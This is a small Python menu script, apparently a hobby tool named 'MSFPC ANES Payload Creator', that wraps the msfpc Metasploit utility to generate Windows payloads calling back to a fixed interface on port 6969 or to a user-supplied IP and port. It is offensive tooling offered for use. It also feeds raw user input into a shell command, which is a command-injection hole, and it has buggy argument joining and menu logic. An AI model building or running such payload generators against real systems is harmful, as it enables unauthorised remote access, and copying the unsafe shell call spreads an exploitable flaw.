#!/usr/bin/python3
# MSFPC ANES shortcut

from subprocess import *
import subprocess
import os # os er en module som gjør at jeg kan gjøre ting på systemet

os.system('clear')

banner="""
 $$$$$$\  $$\   $$\ $$$$$$$$\  $$$$$$\                          ___   
$$  __$$\ $$$\  $$ |$$  _____|$$  __$$\                        /   \\  
$$ /  $$ |$$$$\ $$ |$$ |      $$ /  \__|                  /\\ | . . \\
$$$$$$$$ |$$ $$\$$ |$$$$$\    \$$$$$$\                  ////\\|     ||
$$  __$$ |$$ \$$$$ |$$  __|    \____$$\               ////   \\ ___//\            
$$ |  $$ |$$ |\$$$ |$$ |      $$\   $$ |             ///      \\      \ 
$$ |  $$ |$$ | \$$ |$$$$$$$$\ \$$$$$$  |            ///       |\\      |  
\__|  \__|\__|  \__|\________| \______/            //         | \\  \   \ 
				                   /          |  \\  \   \ 
[MSFPC ANES Payload Creator | Laget av Andreas og Espen]      |   \\ /   / 
					                      |    \/   / 
|1| - Windows eth0 6969 	       	                      |     \\/|     
|2| - Windows $ip $port      	                              |      \\| 
					                      |       \\    
					                      |        |     
					                      |_________\                  
"""

while(True):
    print(banner)

    menu=input(": ")

    if menu=='1':
        command = ('msfpc windows eth0 6969' )
        subprocess.call(command, shell=True)


    if menu=='2':
        command = ('msfpc windows ')
        ip = input('IP: ')
        port = input('PORT: ')
        subprocess.call(command + ip + port, shell=True)

    else:
        print("???")
